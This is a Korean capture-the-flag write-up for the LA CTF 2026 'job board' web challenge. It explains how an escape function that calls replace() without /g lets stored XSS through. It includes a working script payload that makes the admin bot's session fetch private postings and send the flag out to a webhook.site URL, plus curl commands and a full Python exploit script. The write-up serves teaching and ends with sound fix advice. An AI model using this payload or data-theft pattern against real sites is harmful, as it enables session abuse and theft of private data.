# job board (LA CTF 2026)

---

- **Name:** job board
- **Category:** Web
- **Connection:** `https://job-board.chall.lac.tf`
- **Flag format:** `lactf{...}`

---

### 개요

구직 게시판 서비스입니다.
공개 채용 공고에 지원서를 제출할 수 있고, Admin Recruiter 봇이 지원서 URL을 방문해줍니다.

| 역할 | 볼 수 있는 공고 |
|------|----------------|
| 일반 사용자 | 공개 공고만 |
| Admin Recruiter | 공개 + **비공개 공고** |

플래그는 **비공개 공고의 description**에 숨어 있습니다.
어드민 봇이 우리 지원서를 열어주니까, XSS를 지원서에 심으면 어드민 권한으로 코드가 실행됩니다.

---

### 소스 분석

#### htmlEscape 함수

지원서 내용(`why` 필드)이 HTML로 렌더링된다면, 어딘가에서 이스케이프 처리를 할 것입니다.
소스에서 `htmlEscape` 함수를 찾아봅니다.

```js
function htmlEscape(s, quote=true) {
  s = s.replace("&", "&amp;");
  s = s.replace("<", "&lt;");
  s = s.replace(">", "&gt;");
  if (quote) {
    s = s.replace('"', "&quot;");
    s = s.replace("'", "&#39;");
  }
  return s;
}
```

언뜻 보면 특수문자를 잘 이스케이프하는 것처럼 보입니다.
그런데 자세히 보면 뭔가 이상합니다.

JavaScript의 `String.replace()`는 **첫 번째 매치만 교체**합니다.
정규식에 `/g` 플래그가 없으면 같은 문자가 여러 개 있어도 맨 앞 하나만 바뀝니다.

```js
"a<b<c".replace("<", "&lt;")
// → "a&lt;b<c"  ← 두 번째 '<'는 그대로!
```

즉, 입력에 `<`가 두 개 이상 있으면 첫 번째만 이스케이프되고 나머지는 **날것의 HTML 태그로 남습니다.**

---

### 취약점 분석

`htmlEscape`의 동작 방식을 정리하면 이렇습니다.

- `&` → 첫 번째 `&`만 `&amp;`로 교체, 이후 `&`는 그대로
- `<` → 첫 번째 `<`만 `&lt;`로 교체, 이후 `<`는 그대로
- `>` → 첫 번째 `>`만 `&gt;`로 교체, 이후 `>`는 그대로

그러면 입력 맨 앞에 `&<>`를 **미끼로** 넣으면 어떻게 될까요?

```
입력: &<> <script>alert(1)</script>

이스케이프 후:
  &    → &amp;   (첫 번째 & 소비)
  <    → &lt;    (첫 번째 < 소비)
  >    → &gt;    (첫 번째 > 소비)
  <script>...</script>  → 그대로!  ← 이미 소비됐으니까
```

앞에서 각 특수문자의 "한 번짜리 이스케이프"를 전부 소진시키면,
뒤에 오는 `<script>` 태그는 전혀 이스케이프되지 않고 HTML에 그대로 삽입됩니다.

### 공격 전략

XSS를 심는 것까지는 됐는데, 어떻게 플래그를 꺼낼까요?

어드민 봇은 로그인한 상태로 지원서 URL을 방문합니다.
어드민은 비공개 공고까지 볼 수 있으므로, 스크립트가 어드민 세션으로 비공개 공고를 fetch해서 플래그를 찾으면 됩니다.

**공격 흐름:**

```
1. why 필드에 XSS 페이로드 삽입 → 지원서 저장 (Stored XSS)
2. 지원서 URL을 Admin Recruiter 봇에 제출
3. 봇이 URL 방문 → 어드민 세션으로 스크립트 실행
4. 스크립트가 / (인덱스)를 fetch → 모든 공고 링크 수집
5. 각 공고를 fetch → lactf{...} 패턴 탐색
6. 찾은 플래그를 webhook으로 전송
```

비공개 공고의 링크는 인덱스 페이지에서 어드민 세션으로 접근해야 보입니다.
`/job/<uuid>` 형태의 링크를 정규식으로 수집하면 공개/비공개 구분 없이 모두 순회할 수 있습니다.

플래그 탈취는 `new Image().src`를 사용합니다.
`location.href`는 헤드리스 봇 환경에서 리다이렉트가 막히는 경우가 있지만,
이미지 요청은 사이드 이펙트 없이 안정적으로 외부로 데이터를 전송합니다.

### Exploit 실행 과정

**Step 1 — 페이로드 작성**

[webhook.site](https://webhook.site)에서 URL을 발급받아 `YOUR-ID`에 지정합니다.

```html
&<> <script>(async()=>{
  const home = await (await fetch(`/`)).text();
  const links = home.match(/\/job\/[0-9a-f-]{36}/g) || [];
  for (const u of links){
    const t = await (await fetch(u)).text();
    const m = t.match(/lactf\{[^}]+\}/);
    if(m){
      (new Image()).src = `https://webhook.site/YOUR-ID?f=${encodeURIComponent(m[0])}`;
      break;
    }
  }
})();</script>
```

JS 문자열에 백틱(`` ` ``)을 쓴 이유도 있습니다.
`htmlEscape`가 `'`와 `"`도 이스케이프하기 때문에, 따옴표를 쓰면 JS 문자열이 깨집니다.
템플릿 리터럴(백틱)은 이스케이프 대상이 아니라서 그대로 통과합니다.

**Step 2 — 지원서 제출**

아무 공개 공고에나 지원하면서 `why` 필드에 페이로드를 넣습니다.

```bash
# 1. 인덱스에서 공개 공고 ID 하나 수집
JOB_ID=$(curl -s "https://job-board.chall.lac.tf/" \
  | grep -oE '/job/[0-9a-f-]{36}' | head -1 | cut -d/ -f3)

# 2. 페이로드를 why 필드에 담아 지원서 제출
curl -s -X POST "https://job-board.chall.lac.tf/application/$JOB_ID" \
  -d "name=test&email=test@test.com&why=PAYLOAD_HERE"
```

응답 HTML에서 생성된 지원서 URL(`/application/<uuid>`)을 복사합니다.

**Step 3 — 봇 트리거 및 플래그 수신**

Admin Recruiter 봇에 지원서 URL을 제출합니다.
봇이 방문하면 스크립트가 실행되고, 잠시 후 webhook에 플래그가 도착합니다.

```
GET /?f=lactf%7Bc0ngr4ts_0n_y0ur_n3w_l7fe%7D
→ lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}
```

### Exploit 코드 (Python)

```python
#!/usr/bin/env python3
import argparse, re, sys
from urllib.parse import urljoin
import requests

UUID36 = r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"

def build_payload(webhook: str) -> str:
    # 맨 앞 &<>로 일회성 이스케이프를 소진 → 뒤의 <script>가 그대로 삽입됨
    # JS 문자열은 백틱 사용 ('와 "는 htmlEscape가 이스케이프함)
    return (
        "&<> <script>(async()=>{"
        "  const home = await (await fetch(`/`)).text();"
        "  const links = home.match(/\\/job\\/[0-9a-f-]{36}/g) || [];"
        "  for (const u of links){"
        "    const t = await (await fetch(u)).text();"
        "    const m = t.match(/lactf\\{[^}]+\\}/);"
        "    if(m){"
        f"      (new Image()).src = `{webhook}?f=${{encodeURIComponent(m[0])}}`;"
        "      break;"
        "    }"
        "  }"
        "})();</script>"
    )

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="예: https://job-board.chall.lac.tf/")
    ap.add_argument("--webhook", required=True, help="예: https://webhook.site/<uuid>")
    ap.add_argument("--name", default="test")
    ap.add_argument("--email", default="test@test.com")
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    s = requests.Session()

    # 인덱스에서 공개 공고 ID 하나 수집
    r = s.get(base, timeout=15)
    r.raise_for_status()
    m = re.search(rf"/job/({UUID36})", r.text)
    if not m:
        sys.exit("[!] 인덱스에서 공고를 찾지 못했습니다")
    job_id = m.group(1)

    # XSS 페이로드를 why 필드에 담아 지원서 제출
    r = s.post(
        urljoin(base, f"/application/{job_id}"),
        data={"name": args.name, "email": args.email, "why": build_payload(args.webhook)},
        timeout=15,
    )
    r.raise_for_status()

    m = re.search(rf"(/application/{UUID36})", r.text)
    if not m:
        sys.exit("[!] 응답에서 지원서 URL을 찾지 못했습니다")

    app_url = urljoin(base, m.group(1))
    print(f"[+] 지원서 URL: {app_url}")
    print("[*] 이 URL을 Admin Recruiter 봇에 제출한 뒤 webhook을 확인하세요.")

if __name__ == "__main__":
    main()
```

```bash
  --base "https://job-board.chall.lac.tf/" \
  --webhook "https://webhook.site/YOUR-ID"
```

### 요약

이 문제의 핵심은 **일회성 이스케이프(one-shot escape)** 버그입니다.

`String.replace()`는 `/g` 플래그 없이는 첫 번째 매치만 교체합니다.
`htmlEscape`가 `&`, `<`, `>`를 각각 딱 한 번만 처리하기 때문에,
입력 앞에 `&<>`를 미끼로 넣으면 이스케이프 기회를 소진시킬 수 있습니다.

그 뒤에 오는 `<script>` 태그는 전혀 이스케이프되지 않아 Stored XSS가 성립하고,
어드민 봇을 통해 비공개 공고의 플래그를 탈취할 수 있습니다.

수정 방법은 단순합니다. `replace()`를 쓸 때 **항상 `/g` 플래그**를 붙이거나,
`replaceAll()`을 사용하거나, 검증된 sanitization 라이브러리를 쓰면 됩니다.
